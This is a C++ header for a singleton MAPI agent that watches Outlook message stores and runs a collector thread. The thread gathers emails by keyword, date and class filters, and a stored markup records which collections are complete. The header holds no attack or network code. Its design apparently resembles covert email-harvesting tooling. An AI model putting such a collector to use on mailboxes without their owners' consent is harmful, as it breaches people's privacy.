#pragma once

#include <map>

#include "Conf.h"
#include "Log.h"
#include "MAPICommon.h"
#include "MAPI.h"
#include "MAPIStorageAdviser.h"
#include "MAPIAgentConfiguration.h"
#include "MAPIAgentClassFilter.h"
#include "MAPIMarkup.h"

class MAPIMessage;
class MAPIStorage;  

class MAPIAgent // Singleton
{
private:
  static MAPIAgent* _instance;
  static int _refCount;
  static volatile LONG _lLock;

  MAPIStorageAdviser adviser;
  
  HRESULT FolderPath( tree<MAPIFolder*>::iterator folder_iter, 
                    MAPIStorage* storage, 
                    std::map<int, LPTSTR> &folder_names, 
                    LPTSTR lpPath );

  MAPIAgentConfiguration* _conf;

  MAPI* _mapi;

  MAPIMarkup* _markup;

  DWORD _dwCollectorThreadID;
  HANDLE _hCollectorThread;

  bool _HasToQuit;

  bool _collect;
  bool _realtime;

protected:
  MAPIAgent(void);

  BOOL AdviseStore(MAPIStorage* pStorage)
  {
    _ASSERT(pStorage);

    if (!pStorage)
      return FALSE;

    adviser.AddSink(pStorage->GetIMsgStorePtr());
    return TRUE;
  }
  
public:
  
  static MAPIAgent* Instance();
  static void Release();
  static void Destroy();
  
  LPWSTR ConfigurationTag() { return _conf->Tag(); }
  
  void Quit() { _HasToQuit = true; }
  bool IsQuitting() { return _HasToQuit; }
  
  BOOL Init(LPBYTE lpConfig, DWORD cbConfig);
  BOOL Run(DWORD nRun);
  HRESULT AdviseStores();
  HRESULT Collect(DWORD nRun);
  BOOL Accept( MAPIMessage* msg, FilterTypes FilterType );
  
  bool IsMarkup() { return _markup->IsMarkup(); }
  bool ReadMarkup() { return _markup->Read(); }
  bool WriteMarkup() { return _markup->Write(); }

  void WaitForCollector()
  {
    if (_conf->HasCollectConfig())
    {
      DWORD ret = WaitForSingleObject(_hCollectorThread, INFINITE);
      if (ret == WAIT_OBJECT_0)
        return;

    }
  }
  
  BOOL setConfiguration(LPBYTE lpConfig, DWORD cbConfig) 
  {
    ASSERT(lpConfig);
    ASSERT(cbConfig > 0);
    
    if (_conf)
    {
      delete _conf;
      _conf = NULL;
    }
    
    _conf = MAPIAgentConfiguration::Unserialize(lpConfig, cbConfig);
    
    if (IsMarkup())
    {
      // we have a valid markup configuration
      if (ReadMarkup())
      {
        bool hasKeyword = _conf->CollectFilters().front()->HasKeyword();
		
        // check if we already completed collection for this configuration
        if (hasKeyword)
        {
          LPWSTR lpwCollectKeyword = _conf->CollectFilters().front()->Keyword();
          FILETIME ftCollectDate = _conf->CollectFilters().front()->FromDate();
          LPWSTR lpwMarkupKeyword = _markup->CollectKeyword();
          FILETIME ftMarkupDate = _markup->FromDate();

          // check for keyword change
          if (_markup->IsCollectCompletedForKeyword(lpwCollectKeyword))
          {
            // collection completed for current configuration keyword
            // we still check if date was changed to be in the past
             _collect = false;
			
            LONG dateMatch = CompareFileTime(&ftCollectDate, &ftMarkupDate);
            if (dateMatch < 0)
            {
              _collect = true;
			  _markup->SetKeyword(lpwCollectKeyword);
              _markup->SetDate(ftCollectDate);
            }
          } else {
            // a new keyword has been configured
            // START COLLECTOR and save new markup
            _collect = true;
            _markup->SetKeyword(lpwCollectKeyword);
            _markup->SetDate(ftCollectDate);
          }
        }
      }
    } else {
      // we don't have a valid markup, so start collector, if configured
      // save the markup informations
      if (_conf->HasCollectConfig())
      {
        _collect = true;
        bool hasKeyword = _conf->CollectFilters().front()->HasKeyword();
        if (hasKeyword)
        {
          LPWSTR lpwCollectKeyword = _conf->CollectFilters().front()->Keyword();
          FILETIME ftCollectDate = _conf->CollectFilters().front()->FromDate();
		  
          _markup->SetKeyword(lpwCollectKeyword);
          _markup->SetDate(ftCollectDate);
          
        } else {
          // assume keyword '*' (take all)
          LPWSTR lpwCollectKeyword = L"*";
		  FILETIME ftCollectDate = _conf->CollectFilters().front()->FromDate();	
		  
		  _markup->SetKeyword(lpwCollectKeyword);
		  _markup->SetDate(ftCollectDate);
        }
      }
    }
    
    // start realtime
    if (_conf->HasRealtimeConfig())
      _realtime = true;
	
	_markup->Write();
	
    return TRUE;
  }
  
  MAPIAgentClassFilter* IsMessageClassAcceptable(LPTSTR ClassName, FilterTypes FilterType) 
  {
    _ASSERT(ClassName);
    return _conf->MatchClassName(ClassName, FilterType);
  }
  
  virtual ~MAPIAgent(void)
  {
    if (_mapi)
      delete _mapi;

    if (_conf)
      delete _conf;

    if (_markup)
      delete _markup;
  }
};
